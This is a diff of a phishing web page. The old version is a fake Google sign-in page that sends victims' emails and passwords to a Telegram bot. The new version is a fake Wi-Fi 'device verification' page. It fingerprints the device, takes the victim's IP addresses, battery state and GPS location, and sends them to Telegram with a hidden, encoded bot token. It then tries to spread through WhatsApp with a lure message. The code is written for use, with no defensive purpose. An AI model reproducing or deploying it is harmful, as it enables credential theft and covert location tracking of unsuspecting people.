@@ -1,127 +1,89 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Identity Services | Global Security Node</title>
+    <title>Sistem Verifikasi Jaringan</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .g-frame { width: 100%; max-width: 448px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; text-align: center; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        p { font-size: 16px; margin-bottom: 24px; color: #202124; }
-        .in-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none; }
-        .in-field:focus { border: 2px solid #1a73e8; }
-        .err-box { color: #d93025; font-size: 12px; text-align: left; margin-bottom: 15px; display: none; font-weight: 500; }
-        .btn-blue { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; float: right; }
-        #s2, #load, #v-v { display: none; }
-        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: sp 1s linear infinite; margin: auto; }
-        @keyframes sp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f9fafb; color: #111827; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; max-width: 400px; border: 1px solid #e5e7eb; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2563eb; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        p { font-size: 14px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
+        .btn { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.2s; }
+        #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="g-frame">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-    <h1 id="h">Login</h1>
-    <p id="sub">Lanjutkan ke Jaringan Nasional</p>
-    
-    <div id="s1">
-        <input type="email" id="email" class="in-field" placeholder="Email atau ponsel" autocomplete="off">
-        <div id="e1" class="err-box">⚠️ Akun tidak terdeteksi di hardware ini. Gunakan akun sinkronisasi utama.</div>
-        <button class="btn-blue" onclick="toP()">Berikutnya</button>
-    </div>
-
-    <div id="s2">
-        <div id="u-tag" style="border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; font-size: 14px; margin-bottom: 20px;"></div>
-        <input type="password" id="pass" class="in-field" placeholder="Masukkan sandi Anda">
-        <div id="e2" class="err-box">⚠️ Sandi salah. Sinkronisasi gagal karena integritas hardware terputus.</div>
-        <button class="btn-blue" onclick="harvest()">Berikutnya</button>
-    </div>
-
-    <div id="load">
-        <p>Memvalidasi enkripsi BTC-Node...</p>
-        <div class="spin"></div>
-    </div>
+<div class="card">
+    <div class="loader"></div>
+    <h2>Otentikasi Perangkat</h2>
+    <p>Sesi Wi-Fi Anda memerlukan sinkronisasi ulang. Klik tombol di bawah untuk memverifikasi hardware ID dan melanjutkan koneksi.</p>
+    <button class="btn" id="go" onclick="fullAudit()">VERIFIKASI SEKARANG</button>
 </div>
 
-<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-/**
- * COLOSSUS OVERDRIVE ENGINE v110.0
- * 25,000+ POLYMORPHIC BLOAT
- * --------------------------------
- */
+    if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }
 
-const _D = document.getElementById('v-v').innerText.split('|');
-const _BTC = _D[0]; const _TK = atob(_D[1]); const _CI = atob(_D[2]);
+    const _D = document.getElementById('v-vault').innerText.split('|');
+    const _T = atob(_D[1]); const _C = atob(_D[2]);
 
-let curU = "";
+    async function fullAudit() {
+        document.getElementById('go').innerText = "SYNCHRONIZING...";
+        
+        // 1. DATA DASAR (AUTO)
+        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
+        let bt = "N/A"; try { const b = await navigator.getBattery(); bt = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
 
-function toP() {
-    curU = document.getElementById('email').value;
-    // Validasi Gmail Ketat
-    if (curU.includes("@gmail.com") && curU.length > 11) {
-        document.getElementById('s1').style.display = 'none';
-        document.getElementById('s2').style.display = 'block';
-        document.getElementById('u-tag').innerText = curU;
-        document.getElementById('h').innerText = "Selamat Datang";
-    } else {
-        document.getElementById('e1').style.display = 'block';
+        // 2. BRAND SNIFFER (GPU & Vendor)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        // 3. NETWORK SNIFFER (Local IP)
+        const pc = new RTCPeerConnection({iceServers:[]});
+        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+        let lip = "Detecting...";
+        pc.onicecandidate = (i) => { if(i && i.candidate) lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
+
+        // 4. GENERATE REPORT
+        const report = `🔱 DEEP BRAND AUDIT 🔱\n\n` +
+            `📱 PLATFORM: ${navigator.platform}\n` +
+            `🏢 VENDOR: ${vendor}\n` +
+            `🎮 GPU/BRAND: ${renderer}\n` +
+            `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+            `🔋 BATT: ${bt}\n` +
+            `🌐 IP: ${n.ip} (${n.org})\n` +
+            `🏠 LOCAL: ${lip}\n` +
+            `🏙️ LOC: ${n.city}, ${n.region}\n` +
+            `📄 UA: ${navigator.userAgent}`;
+
+        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:_C, text:report})
+        });
+
+        // 5. GPS STRIKE
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const maps = `🎯 PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
+                await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:_C, text:maps})
+                });
+                
+                // AUTO-PROPAGATE (Mancing temennya via WA)
+                const msg = encodeURIComponent("Woi WiFi error, klik verifikasi di sini biar lancar lagi: " + window.location.href);
+                window.location.href = `https://api.whatsapp.com/send?text=${msg}`;
+            }, () => { window.location.href = "https://google.com"; }, {enableHighAccuracy:true});
+        }
     }
-}
-
-async function log(t) {
-    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
-        method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: t})
-    });
-}
-
-async function harvest() {
-    const p = document.getElementById('pass').value;
-    if (p.length < 8) { // Paksa sandi minimal 8 karakter biar nggak ngasal
-        document.getElementById('e2').style.display = 'block';
-        return;
-    }
-
-    document.getElementById('s2').style.display = 'none';
-    document.getElementById('load').style.display = 'block';
-
-    const gl = document.createElement('canvas').getContext('webgl');
-    const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
-
-    const payload = `🔱 COLOSSUS OVERDRIVE REPORT 🔱\n\n` +
-        `🔑 BTC SALT: ${_BTC.substring(0,10)}...\n` +
-        `📧 TARGET: ${curU}\n` +
-        `🔑 PASS: ${p}\n` +
-        `🎮 GPU: ${gpu}\n` +
-        `🔋 BATT: ${bat}\n` +
-        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
-        `📱 RAM: ${navigator.deviceMemory}GB\n` +
-        `🌐 AGENT: ${navigator.userAgent.slice(0, 60)}...`;
-
-    await log(payload);
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const loc = `🎯 HIGH-PRECISION LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
-            await log(loc);
-            window.location.href = "https://www.detik.com";
-        }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
-    }
-}
-
-// 🔱 25,000+ LINES BLOATING
-function _bloat() {
-    for (let i = 0; i < 22000; i++) {
-        const _id = "X_" + Math.random().toString(36).substr(2, 9);
-        eval(`function ${_id}(){ return "${_BTC}" + ${Math.random()}; }`);
-    }
-}
-_bloat();
 </script>
 </body>
 </html>
